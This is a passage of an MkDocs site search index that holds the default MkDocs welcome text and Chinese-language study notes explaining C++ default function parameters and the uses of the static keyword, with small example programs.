{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to MkDocs \u00b6 For full documentation visit mkdocs.org . Commands \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit. Project layout \u00b6 mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"\u9996\u9875"},{"location":"#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"c_cpp/2021_02_06_cpp_function_default_parameters/","text":"C++\u7684\u7f3a\u7701\u51fd\u6570\u5230\u5e95\u662f\u5728\u58f0\u660e\u4e2d\u786e\u5b9a\u8fd8\u662f\u5728\u5b9a\u4e49\u4e2d\u786e\u5b9a\uff1f \u00b6 \u9996\u5148\uff0c\u7f16\u8bd1\u5668\u662f\u7981\u6b62\u5728\u540c\u65f6\u5728\u58f0\u660e\u548c\u5b9a\u4e49\u4e2d\u786e\u5b9a\u7f3a\u7701\u53c2\u6570\uff0c\u53ea\u80fd\u5728\u5176\u4e2d\u4e00\u4e2a\u5730\u65b9\u786e\u5b9a\u7f3a\u7701\u53c2\u6570\u3002\u6ce8\u610f\uff0c\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u786e\u5b9a\u7f3a\u7701\u53c2\u6570\u65f6\uff0c\u5b9a\u4e49\u8981\u5728\u8c03\u7528\u4e4b\u524d\uff0c\u5373 #include<iostream> using namespace std; int sum(int x,int y); // \u51fd\u6570\u58f0\u660e int main(){ cout<<sum()<<endl; // error: too few arguments to function 'int sum(int, int)' } int sum(int x=1,int y=2){ // \u51fd\u6570\u5b9a\u4e49 return x+y; } \u8981\u6539\u6210 #include<iostream> using namespace std; int sum(int x,int y); // \u51fd\u6570\u58f0\u660e int sum(int x=1,int y=2){ // \u51fd\u6570\u5b9a\u4e49 return x+y; } int main(){ cout<<sum()<<endl; // error: too few arguments to function 'int sum(int, int)' } \u90a3\u4e48\uff0cC++\u7684\u7f3a\u7701\u51fd\u6570\u5230\u5e95\u662f\u5728\u58f0\u660e\u4e2d\u786e\u5b9a\u8fd8\u662f\u5728\u5b9a\u4e49\u4e2d\u786e\u5b9a\uff1f \u58f0\u660e\u662f\u7528\u6237\u53ef\u4ee5\u770b\u5230\u7684\u90e8\u5206\uff0c\u800c\u5b9a\u4e49\u901a\u5e38\u662f\u7528\u6237\u4e0d\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u5982\u679c\u5728\u5b9a\u4e49\u4e2d\u786e\u5b9a\u7f3a\u7701\u503c\u7684\u8bdd\uff0c\u7528\u6237\u770b\u4e0d\u5230\uff0c\u56e0\u6b64\uff0c\u901a\u5e38\u5728\u58f0\u660e\u4e2d\u786e\u5b9a\u7f3a\u7701\u503c\u3002","title":"C++\u7684\u7f3a\u7701\u51fd\u6570\u5230\u5e95\u662f\u5728\u58f0\u660e\u4e2d\u786e\u5b9a\u8fd8\u662f\u5728\u5b9a\u4e49\u4e2d\u786e\u5b9a"},{"location":"c_cpp/2021_02_06_cpp_function_default_parameters/#c","text":"\u9996\u5148\uff0c\u7f16\u8bd1\u5668\u662f\u7981\u6b62\u5728\u540c\u65f6\u5728\u58f0\u660e\u548c\u5b9a\u4e49\u4e2d\u786e\u5b9a\u7f3a\u7701\u53c2\u6570\uff0c\u53ea\u80fd\u5728\u5176\u4e2d\u4e00\u4e2a\u5730\u65b9\u786e\u5b9a\u7f3a\u7701\u53c2\u6570\u3002\u6ce8\u610f\uff0c\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u786e\u5b9a\u7f3a\u7701\u53c2\u6570\u65f6\uff0c\u5b9a\u4e49\u8981\u5728\u8c03\u7528\u4e4b\u524d\uff0c\u5373 #include<iostream> using namespace std; int sum(int x,int y); // \u51fd\u6570\u58f0\u660e int main(){ cout<<sum()<<endl; // error: too few arguments to function 'int sum(int, int)' } int sum(int x=1,int y=2){ // \u51fd\u6570\u5b9a\u4e49 return x+y; } \u8981\u6539\u6210 #include<iostream> using namespace std; int sum(int x,int y); // \u51fd\u6570\u58f0\u660e int sum(int x=1,int y=2){ // \u51fd\u6570\u5b9a\u4e49 return x+y; } int main(){ cout<<sum()<<endl; // error: too few arguments to function 'int sum(int, int)' } \u90a3\u4e48\uff0cC++\u7684\u7f3a\u7701\u51fd\u6570\u5230\u5e95\u662f\u5728\u58f0\u660e\u4e2d\u786e\u5b9a\u8fd8\u662f\u5728\u5b9a\u4e49\u4e2d\u786e\u5b9a\uff1f \u58f0\u660e\u662f\u7528\u6237\u53ef\u4ee5\u770b\u5230\u7684\u90e8\u5206\uff0c\u800c\u5b9a\u4e49\u901a\u5e38\u662f\u7528\u6237\u4e0d\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u5982\u679c\u5728\u5b9a\u4e49\u4e2d\u786e\u5b9a\u7f3a\u7701\u503c\u7684\u8bdd\uff0c\u7528\u6237\u770b\u4e0d\u5230\uff0c\u56e0\u6b64\uff0c\u901a\u5e38\u5728\u58f0\u660e\u4e2d\u786e\u5b9a\u7f3a\u7701\u503c\u3002","title":"C++\u7684\u7f3a\u7701\u51fd\u6570\u5230\u5e95\u662f\u5728\u58f0\u660e\u4e2d\u786e\u5b9a\u8fd8\u662f\u5728\u5b9a\u4e49\u4e2d\u786e\u5b9a\uff1f"},{"location":"c_cpp/2021_02_20_cpp_static/","text":"C++\u5173\u952e\u5b57static\u603b\u7ed3 \u00b6 C++\u7684static\u5173\u952e\u5b57\u6709\u4e24\u79cd\u7528\u6cd5\uff0c\u5206\u522b\u662f\u9762\u5411\u8fc7\u7a0b\u548c\u9762\u5411\u5bf9\u8c61\u3002\u9762\u5411\u8fc7\u7a0b\u6709\u9759\u6001\u5168\u5c40\u53d8\u91cf\uff0c\u9759\u6001\u5c40\u90e8\u53d8\u91cf\uff0c\u9759\u6001\u51fd\u6570\uff1b\u9762\u5411\u5bf9\u8c61\u6709\u9759\u6001\u6210\u5458\u53d8\u91cf\uff0c\u9759\u6001\u6210\u5458\u51fd\u6570\u3002 \u9762\u5411\u8fc7\u7a0b \u00b6 \u9759\u6001\u5168\u5c40\u53d8\u91cf \u00b6 \u5728\u5168\u5c40\u53d8\u91cf\u524d\uff0c\u52a0\u4e0a\u5173\u952e\u5b57static\uff0c\u8be5\u53d8\u91cf\u5c31\u88ab\u5b9a\u4e49\u6210\u4e3a\u4e00\u4e2a\u9759\u6001\u5168\u5c40\u53d8\u91cf\u3002\u4f8b\u5982\uff1a #include<iostream> using namespace std; static int globalValue1; int main() { cout << globalValue1 << endl; } \u9759\u6001\u5168\u5c40\u53d8\u91cf\u7531\u4ee5\u4e0b\u7279\u70b9\uff1a \u8be5\u53d8\u91cf\u5728\u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff0c\u5176\u5b9e\u9759\u6001\u53d8\u91cf\u90fd\u5728\u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff0c\u5305\u62ec\u9759\u6001\u5c40\u90e8\u53d8\u91cf \u672a\u7ecf\u521d\u59cb\u5316\u7684\u9759\u6001\u5168\u5c40\u53d8\u91cf\u4f1a\u88ab\u7a0b\u5e8f\u81ea\u52a8\u521d\u59cb\u5316\u4e3a0\uff08\u81ea\u52a8\u53d8\u91cf\u7684\u81ea\u52a8\u521d\u59cb\u5316\u503c\u662f\u968f\u673a\u7684\uff09 \u9759\u6001\u5168\u5c40\u53d8\u91cf\u5728\u58f0\u660e\u5b83\u7684\u6574\u4e2a\u6587\u4ef6\u90fd\u662f\u53ef\u89c1\u7684\uff0c\u800c\u5728\u6587\u4ef6\u4e4b\u5916\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u5373\u9759\u6001\u5168\u5c40\u53d8\u91cf\u4e0d\u80fd\u88ab\u5176\u5b83\u6587\u4ef6\u6240\u7528\u3002\u56e0\u6b64\uff0c \u5176\u5b83\u6587\u4ef6\u4e2d\u53ef\u4ee5\u5b9a\u4e49\u76f8\u540c\u540d\u5b57\u7684\u53d8\u91cf\uff0c\u4e0d\u4f1a\u53d1\u751f\u51b2\u7a81 \uff0c\u8fd9\u662f\u9759\u6001\u5168\u5c40\u53d8\u91cf\u7684\u4f18\u70b9\u3002 \u4f8b\u5982 //main.cpp #include<iostream> using namespace std; static int globalValue1; int main() { cout << globalValue1 << endl; } //source.cpp #include<iostream> using namespace std; int globalValue1 = 1; void f1() { globalValue1 += 1; cout << globalValue1 << endl; } \u5982\u679c\u4e24\u4e2a\u6587\u4ef6\u91cc\u7684 globalValue1 \u90fd\u6ca1\u6709static\u4fee\u9970\uff0c\u8fd9\u56de\u5f15\u53d1\u91cd\u5b9a\u4e49\u7684\u9519\u8bef\uff1b\u53ea\u8981\u6709\u4e00\u4e2a gobalValue1 \u6709\u4fee\u9970\u90fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\u3002 \u5982\u679c\u628asource.cpp\u7684 globalValue1 \u6539\u6210 extern int globalValue1 \uff0c\u4e5f\u4f1a\u62a5\u9519\u3002 \u9759\u6001\u5c40\u90e8\u53d8\u91cf \u00b6 \u5728\u5c40\u90e8\u53d8\u91cf\u524d\uff0c\u52a0\u4e0a\u5173\u952e\u5b57static\uff0c\u8be5\u53d8\u91cf\u5c31\u88ab\u5b9a\u4e49\u6210\u4e3a\u4e00\u4e2a\u9759\u6001\u5c40\u90e8\u53d8\u91cf\u3002\u5b83\u6709\u4ee5\u4e0b\u7279\u70b9 \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u5728\u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff1b \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u5728\u7a0b\u5e8f\u6267\u884c\u5230\u8be5\u5bf9\u8c61\u7684\u58f0\u660e\u5904\u65f6\u88ab\u9996\u6b21\u521d\u59cb\u5316\uff0c\u5373\u4ee5\u540e\u7684\u51fd\u6570\u8c03\u7528\u4e0d\u518d\u8fdb\u884c\u521d\u59cb\u5316\uff1b \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u4e00\u822c\u5728\u58f0\u660e\u5904\u521d\u59cb\u5316\uff0c\u5982\u679c\u6ca1\u6709\u663e\u5f0f\u521d\u59cb\u5316\uff0c\u4f1a\u88ab\u7a0b\u5e8f\u81ea\u52a8\u521d\u59cb\u5316\u4e3a0\uff1b \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u59cb\u7ec8\u9a7b\u7559\u5728\u5168\u5c40\u6570\u636e\u533a\uff0c\u76f4\u5230\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\u3002\u4f46\u5176\u4f5c\u7528\u57df\u4e3a\u5c40\u90e8\u4f5c\u7528\u57df\uff0c\u5f53\u5b9a\u4e49\u5b83\u7684\u51fd\u6570\u6216\u8bed\u53e5\u5757\u7ed3\u675f\u65f6\uff0c\u5176\u4f5c\u7528\u57df\u968f\u4e4b\u7ed3\u675f \u5e94\u7528\u573a\u666f \u00b6 \u901a\u5e38\uff0c\u5728\u51fd\u6570\u4f53\u5185\u5b9a\u4e49\u4e86\u4e00\u4e2a\u53d8\u91cf\uff0c\u6bcf\u5f53\u7a0b\u5e8f\u8fd0\u884c\u5230\u8be5\u8bed\u53e5\u65f6\u90fd\u4f1a\u7ed9\u8be5\u5c40\u90e8\u53d8\u91cf\u5206\u914d\u6808\u5185\u5b58\u3002\u4f46\u968f\u7740\u7a0b\u5e8f\u9000\u51fa\u51fd\u6570\u4f53\uff0c\u7cfb\u7edf\u5c31\u4f1a\u6536\u56de\u6808\u5185\u5b58\uff0c\u5c40\u90e8\u53d8\u91cf\u4e5f\u76f8\u5e94\u5931\u6548\u3002 \u4f46\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u5728\u4e24\u6b21\u8c03\u7528\u4e4b\u95f4\u5bf9\u53d8\u91cf\u7684\u503c\u8fdb\u884c\u4fdd\u5b58\u3002\u901a\u5e38\u7684\u60f3\u6cd5\u662f\u5b9a\u4e49\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u6765\u5b9e\u73b0\u3002\u4f46\u8fd9\u6837\u4e00\u6765\uff0c\u53d8\u91cf\u5df2\u7ecf\u4e0d\u518d\u5c5e\u4e8e\u51fd\u6570\u672c\u8eab\u4e86\uff0c\u4e0d\u518d\u4ec5\u53d7\u51fd\u6570\u7684\u63a7\u5236\uff0c\u8fd9\u7ed9\u7a0b\u5e8f\u7684\u7ef4\u62a4\u5e26\u6765\u4e0d\u4fbf\u3002 \u9759\u6001\u5c40\u90e8\u53d8\u91cf\u6b63\u597d\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u9759\u6001\u5c40\u90e8\u53d8\u91cf\u4fdd\u5b58\u5728\u5168\u5c40\u6570\u636e\u533a\uff0c\u800c\u4e0d\u662f\u4fdd\u5b58\u5728\u6808\u4e2d\uff0c\u6bcf\u6b21\u7684\u503c\u4fdd\u6301\u5230\u4e0b\u4e00\u6b21\u8c03\u7528\uff0c\u76f4\u5230\u4e0b\u6b21\u8d4b\u65b0\u503c\u3002 \u4f8b\u5982 #include <iostream.h> void fn(); void main() { fn(); //10 fn(); //11 fn(); //12 } void fn() { static n=10; cout<<n<<endl; n++; } \u9759\u6001\u51fd\u6570 \u00b6 \u5728\u51fd\u6570\u7684\u8fd4\u56de\u7c7b\u578b\u524d\u52a0\u4e0astatic\u5173\u952e\u5b57,\u51fd\u6570\u5373\u88ab\u5b9a\u4e49\u4e3a\u9759\u6001\u51fd\u6570\u3002\u9759\u6001\u51fd\u6570\u4e0e\u666e\u901a\u51fd\u6570\u4e0d\u540c\uff0c\u5b83\u53ea\u80fd\u5728\u58f0\u660e\u5b83\u7684\u6587\u4ef6\u5f53\u4e2d\u53ef\u89c1\uff0c\u4e0d\u80fd\u88ab\u5176\u5b83\u6587\u4ef6\u4f7f\u7528\u3002\u5b9a\u4e49\u9759\u6001\u51fd\u6570\u7684\u597d\u5904\uff1a\uff08\u7c7b\u4f3c\u4e8e\u9759\u6001\u5168\u5c40\u53d8\u91cf\uff09 \u9759\u6001\u51fd\u6570\u4e0d\u80fd\u88ab\u5176\u5b83\u6587\u4ef6\u6240\u7528\uff1b \u5176\u5b83\u6587\u4ef6\u4e2d\u53ef\u4ee5\u5b9a\u4e49\u76f8\u540c\u540d\u5b57\u7684\u51fd\u6570\uff0c\u4e0d\u4f1a\u53d1\u751f\u51b2\u7a81\uff1b \u53ef\u4ee5\u628a\u9759\u6001\u51fd\u6570\u7684\u5b9a\u4e49\u653e\u5230.h\u6587\u4ef6\uff0c\u591a\u4e2a.cpp\u6587\u4ef6include\u65f6\uff0c\u4e0d\u4f1a\u5f15\u8d77\u91cd\u5b9a\u4e49\u7684\u9519\u8bef\u3002 \u4f8b\u5982 // main.cpp #include<iostream> // #include\"source.h\",\u5373\u4f7finclude\u4e86void f1();\u7684\u58f0\u660e\uff0c\u4e5f\u4e0d\u4f1a\u62a5\u9519 using namespace std; static void f1() { cout << \"main.f1()\" << endl; } int main() { f1(); } // source.cpp #include<iostream> #include \"source.h\" void f1() { std::cout << \"source.f1\" << std::endl; } \u9762\u5411\u5bf9\u8c61 \u00b6 \u9759\u6001\u6570\u636e\u6210\u5458 \u00b6 \u5728\u7c7b\u5185\u6570\u636e\u6210\u5458\u7684\u58f0\u660e\u524d\u52a0\u4e0a\u5173\u952e\u5b57static\uff0c\u8be5\u6570\u636e\u6210\u5458\u5c31\u662f\u7c7b\u5185\u7684\u9759\u6001\u6570\u636e\u6210\u5458\u3002\u4f8b\u5982 // main.cpp #include<iostream> #include\"source.h\" using namespace std; int main() { MyClass a(1, 2, 3); a.getSum(); MyClass b(2, 3, 4); b.getSum(); a.getSum(); cout << MyClass::Num << endl; } // source.h #pragma once class MyClass { public: static int Num; MyClass(int a,int b,int c); void getSum(); private: int a, b, c; static int Sum; // \u58f0\u660e\u9759\u6001\u6570\u636e\u6210\u5458 }; // source.cpp #include<iostream> #include \"source.h\" using namespace std; int MyClass::Num = 3; int MyClass::Sum = 0; // \u5b9a\u4e49\u5e76\u521d\u59cb\u5316\u9759\u6001\u6570\u636e\u6210\u5458 MyClass::MyClass(int a, int b, int c) { this->a = a; this->b = b; this->c = c; Sum = a + b + c; } void MyClass::getSum() { cout << Sum << endl; } \u5b83\u6709\u4ee5\u4e0b\u7279\u70b9 \u9759\u6001\u6210\u5458\u53d8\u91cf\u662f\u8be5\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u6240\u5171\u6709\u7684\u3002\u5bf9\u4e8e\u666e\u901a\u6210\u5458\u53d8\u91cf\uff0c\u6bcf\u4e2a\u7c7b\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u4e00\u4efd\u62f7\u8d1d\u3002\u800c\u9759\u6001\u6210\u5458\u53d8\u91cf\u4e00\u5171\u5c31\u4e00\u4efd\uff0c\u65e0\u8bba\u8fd9\u4e2a\u7c7b\u7684\u5bf9\u8c61\u88ab\u5b9a\u4e49\u4e86\u591a\u5c11\u4e2a\uff0c\u9759\u6001\u6210\u5458\u53d8\u91cf\u53ea\u5206\u914d\u4e00\u6b21\u5185\u5b58\uff0c\u7531\u8be5\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u5171\u4eab\u8bbf\u95ee\u3002\u6240\u4ee5\uff0c\u9759\u6001\u6570\u636e\u6210\u5458\u7684\u503c\u5bf9\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u662f\u4e00\u6837\u7684\uff0c\u5b83\u7684\u503c\u53ef\u4ee5\u66f4\u65b0\uff1b \u56e0\u4e3a\u9759\u6001\u6570\u636e\u6210\u5458\u5728 \u5168\u5c40\u6570\u636e\u533a\u5206\u914d\u5185\u5b58 \uff0c\u7531\u672c\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u5171\u4eab\uff0c\u6240\u4ee5\uff0c\u5b83\u4e0d\u5c5e\u4e8e\u7279\u5b9a\u7684\u7c7b\u5bf9\u8c61\uff0c\u4e0d\u5360\u7528\u5bf9\u8c61\u7684\u5185\u5b58\uff0c\u800c\u662f\u5728\u6240\u6709\u5bf9\u8c61\u4e4b\u5916\u5f00\u8f9f\u5185\u5b58\uff0c \u5728\u6ca1\u6709\u4ea7\u751f\u7c7b\u5bf9\u8c61\u65f6\u5176\u4f5c\u7528\u57df\u5c31\u53ef\u89c1 \u3002\u56e0\u6b64\uff0c\u5728\u6ca1\u6709\u7c7b\u7684\u5b9e\u4f8b\u5b58\u5728\u65f6\uff0c\u9759\u6001\u6210\u5458\u53d8\u91cf\u5c31\u5df2\u7ecf\u5b58\u5728\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u64cd\u4f5c\u5b83\uff1b \u9759\u6001\u6210\u5458\u53d8\u91cf\u5b58\u50a8\u5728\u5168\u5c40\u6570\u636e\u533a\u3002 static \u6210\u5458\u53d8\u91cf\u7684\u5185\u5b58\u7a7a\u95f4\u65e2\u4e0d\u662f\u5728\u58f0\u660e\u7c7b\u65f6\u5206\u914d\uff0c\u4e5f\u4e0d\u662f\u5728\u521b\u5efa\u5bf9\u8c61\u65f6\u5206\u914d\uff0c\u800c\u662f\u5728\u521d\u59cb\u5316\u65f6\u5206\u914d\u3002\u9759\u6001\u6210\u5458\u53d8\u91cf\u5fc5\u987b\u521d\u59cb\u5316\uff0c\u800c\u4e14\u53ea\u80fd\u5728\u7c7b\u4f53\u5916\u8fdb\u884c\u3002 \u5426\u5219\uff0c\u7f16\u8bd1\u80fd\u901a\u8fc7\uff0c\u94fe\u63a5\u4e0d\u80fd\u901a\u8fc7\u3002\u5728source.cpp\u4e2d\uff0c\u8bed\u53e5 int Myclass::Sum=0; \u662f\u5b9a\u4e49\u5e76\u521d\u59cb\u5316\u9759\u6001\u6210\u5458\u53d8\u91cf\u3002\u521d\u59cb\u5316\u65f6\u53ef\u4ee5\u8d4b\u521d\u503c\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u8d4b\u503c\u3002\u5982\u679c\u4e0d\u8d4b\u503c\uff0c\u90a3\u4e48\u4f1a\u88ab\u9ed8\u8ba4\u521d\u59cb\u5316\uff0c\u4e00\u822c\u662f 0\u3002\u9759\u6001\u6570\u636e\u533a\u7684\u53d8\u91cf\u90fd\u6709\u9ed8\u8ba4\u7684\u521d\u59cb\u503c\uff0c\u800c\u52a8\u6001\u6570\u636e\u533a\uff08\u5806\u533a\u3001\u6808\u533a\uff09\u7684\u53d8\u91cf\u9ed8\u8ba4\u662f\u5783\u573e\u503c\u3002\u5e76\u4e14\uff0c\u4e00\u822c\u4e0d\u518d.h\u6587\u4ef6\u91cc\u5b9a\u4e49\u5e76\u521d\u59cb\u5316\u9759\u6001\u6210\u5458\u53d8\u91cf\uff0c\u5426\u5219\u5982\u679c\u591a\u4e2a\u6e90\u6587\u4ef6include\u8be5\u5934\u6587\u4ef6\u662f\uff0c\u4f1a\u5bfc\u81f4\u91cd\u5b9a\u4e49\u9519\u8bef\u3002 static \u6210\u5458\u53d8\u91cf\u548c\u666e\u901a static \u53d8\u91cf\u4e00\u6837\uff0c\u7f16\u8bd1\u65f6\u5728\u9759\u6001\u6570\u636e\u533a\u5206\u914d\u5185\u5b58\uff0c\u5230\u7a0b\u5e8f\u7ed3\u675f\u65f6\u624d\u91ca\u653e\u3002\u8fd9\u5c31\u610f\u5473\u7740\uff0cstatic \u6210\u5458\u53d8\u91cf\u4e0d\u968f\u5bf9\u8c61\u7684\u521b\u5efa\u800c\u5206\u914d\u5185\u5b58\uff0c\u4e5f\u4e0d\u968f\u5bf9\u8c61\u7684\u9500\u6bc1\u800c\u91ca\u653e\u5185\u5b58\u3002\u800c\u666e\u901a\u6210\u5458\u53d8\u91cf\u5728\u5bf9\u8c61\u521b\u5efa\u65f6\u5206\u914d\u5185\u5b58\uff0c\u5728\u5bf9\u8c61\u9500\u6bc1\u65f6\u91ca\u653e\u5185\u5b58\u3002 \u9759\u6001\u6570\u636e\u6210\u5458\u521d\u59cb\u5316\u4e0e\u4e00\u822c\u6570\u636e\u6210\u5458\u521d\u59cb\u5316\u4e0d\u540c\u3002 \u521d\u59cb\u5316\u65f6\u53ef\u4ee5\u4e0d\u52a0 static\uff0c\u4f46\u5fc5\u987b\u8981\u6709\u6570\u636e\u7c7b\u578b\u3002 \u88ab private\u3001protected\u3001public \u4fee\u9970\u7684 static \u6210\u5458\u53d8\u91cf\u90fd\u53ef\u4ee5\u7528\u8fd9\u79cd\u65b9\u5f0f\u521d\u59cb\u5316\u3002\u9759\u6001\u6570\u636e\u6210\u5458\u521d\u59cb\u5316\u7684\u683c\u5f0f\u4e3a\uff1a\uff1c\u6570\u636e\u7c7b\u578b\uff1e\uff1c\u7c7b\u540d\uff1e::\uff1c\u9759\u6001\u6570\u636e\u6210\u5458\u540d\uff1e=\uff1c\u503c\uff1e \u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf\u8bbf\u95ee\u5f62\u5f0f1\uff1a\uff1c\u7c7b\u5bf9\u8c61\u540d\uff1e.\uff1c\u9759\u6001\u6570\u636e\u6210\u5458\u540d\uff1e \u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf\u8bbf\u95ee\u5f62\u5f0f2\uff1a\uff1c\u7c7b\u7c7b\u578b\u540d\uff1e::\uff1c\u9759\u6001\u6570\u636e\u6210\u5458\u540d\uff1e\uff0c\u4e5f\u5373\uff0c \u9759\u6001\u6210\u5458\u4e0d\u9700\u8981\u901a\u8fc7\u5bf9\u8c61\u5c31\u80fd\u8bbf\u95ee\u3002 \u9759\u6001\u6570\u636e\u6210\u5458\u548c\u666e\u901a\u6570\u636e\u6210\u5458\u4e00\u6837\u9075\u4ecepublic,protected,private\u8bbf\u95ee\u89c4\u5219\uff1b \u5982\u679c\u9759\u6001\u6570\u636e\u6210\u5458\u7684\u8bbf\u95ee\u6743\u9650\u5141\u8bb8\u7684\u8bdd\uff08\u5373public\u7684\u6210\u5458\uff09\uff0c\u53ef\u5728\u7a0b\u5e8f\u4e2d\uff0c\u6309\u4e0a\u8ff0\u683c\u5f0f\u6765\u5f15\u7528\u9759\u6001\u6570\u636e\u6210\u5458 \uff1b sizeof \u8fd0\u7b97\u7b26\u4e0d\u4f1a\u8ba1\u7b97 \u9759\u6001\u6210\u5458\u53d8\u91cf\u3002 \u9759\u6001\u6210\u5458\u51fd\u6570 \u00b6 \u4e0e\u9759\u6001\u6210\u5458\u53d8\u91cf\u7c7b\u4f3c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u58f0\u660e\u4e00\u4e2a\u9759\u6001\u6210\u5458\u51fd\u6570\u3002 \u9759\u6001\u6210\u5458\u51fd\u6570\u4e3a\u7c7b\u670d\u52a1\u800c\u4e0d\u662f\u4e3a\u67d0\u4e00\u4e2a\u7c7b\u7684\u5177\u4f53\u5bf9\u8c61\u670d\u52a1\u3002\u9759\u6001\u6210\u5458\u51fd\u6570\u4e0e\u9759\u6001\u6210\u5458\u53d8\u91cf\u4e00\u6837\uff0c\u90fd\u662f\u7c7b\u7684\u5185\u90e8\u5b9e\u73b0\uff0c\u5c5e\u4e8e\u7c7b\u5b9a\u4e49\u7684\u4e00\u90e8\u5206\u3002\u666e\u901a\u6210\u5458\u51fd\u6570\u5fc5\u987b\u5177\u4f53\u4f5c\u7528\u4e8e\u67d0\u4e2a\u5bf9\u8c61\uff0c\u800c\u9759\u6001\u6210\u5458\u51fd\u6570\u5e76\u4e0d\u5177\u4f53\u4f5c\u7528\u4e8e\u67d0\u4e2a\u5bf9\u8c61\u3002 \u666e\u901a\u7684\u6210\u5458\u51fd\u6570\u4e00\u822c\u90fd\u9690\u542b\u4e86\u4e00\u4e2athis\u6307\u9488\uff0cthis\u6307\u9488\u6307\u5411\u7c7b\u7684\u5bf9\u8c61\u672c\u8eab\uff0c\u56e0\u4e3a\u666e\u901a\u6210\u5458\u51fd\u6570\u603b\u662f\u5177\u4f53\u5730\u5c5e\u4e8e\u7c7b\u7684\u67d0\u4e2a\u5177\u4f53\u5bf9\u8c61\u7684\u3002\u5f53\u51fd\u6570\u88ab\u8c03\u7528\u65f6\uff0c\u7cfb\u7edf\u4f1a\u628a\u5f53\u524d\u5bf9\u8c61\u7684\u8d77\u59cb\u5730\u5740\u8d4b\u7ed9 this \u6307\u9488\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cthis\u662f\u7f3a\u7701\u7684\u3002\u5982\u51fd\u6570fn()\u5b9e\u9645\u4e0a\u662fthis->fn()\u3002 \u4e0e\u666e\u901a\u51fd\u6570\u76f8\u6bd4\uff0c\u9759\u6001\u6210\u5458\u51fd\u6570\u5c5e\u4e8e\u7c7b\u672c\u8eab\uff0c\u800c\u4e0d\u4f5c\u7528\u4e8e\u5bf9\u8c61\uff0c\u56e0\u6b64\u5b83\u4e0d\u5177\u6709this\u6307\u9488\u3002\u6b63\u56e0\u4e3a\u5b83\u6ca1\u6709\u6307\u5411\u67d0\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u8bbf\u95ee\u5c5e\u4e8e\u7c7b\u5bf9\u8c61\u7684\u975e\u9759\u6001\u6210\u5458\u53d8\u91cf\u548c\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\uff0c\u5b83\u53ea\u80fd\u8c03\u7528\u5176\u4f59\u7684\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u9759\u6001\u6210\u5458\u53d8\u91cf\u3002\u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u7531\u4e8e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u9759\u6001\u6210\u5458\u53d8\u91cf\u5728\u7c7b\u5b9e\u4f8b\u5316\u4e4b\u524d\u5c31\u5df2\u7ecf\u5b58\u5728\u53ef\u4ee5\u8bbf\u95ee\uff0c\u800c\u6b64\u65f6\u975e\u9759\u6001\u6210\u5458\u8fd8\u662f\u4e0d\u5b58\u5728\u7684\uff0c\u56e0\u6b64\u9759\u6001\u6210\u5458\u4e0d\u80fd\u8bbf\u95ee\u975e\u9759\u6001\u6210\u5458\u3002 \u9759\u6001\u6210\u5458\u51fd\u6570\u7684\u7279\u70b9\uff1a \u51fa\u73b0\u5728\u7c7b\u4f53\u5916\u7684\u51fd\u6570\u5b9a\u4e49\u4e0d\u80fd\u6307\u5b9a\u5173\u952e\u5b57static\uff1b \u9759\u6001\u6210\u5458\u4e4b\u95f4\u53ef\u4ee5\u76f8\u4e92\u8bbf\u95ee\uff0c\u5373\u9759\u6001\u6210\u5458\u51fd\u6570\uff08\u4ec5\uff09\u53ef\u4ee5\u8bbf\u95ee\u9759\u6001\u6210\u5458\u53d8\u91cf\u3001\u9759\u6001\u6210\u5458\u51fd\u6570\uff1b \u9759\u6001\u6210\u5458\u51fd\u6570\u4e0d\u80fd\u8bbf\u95ee\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u975e\u9759\u6001\u6210\u5458\u53d8\u91cf\uff1b 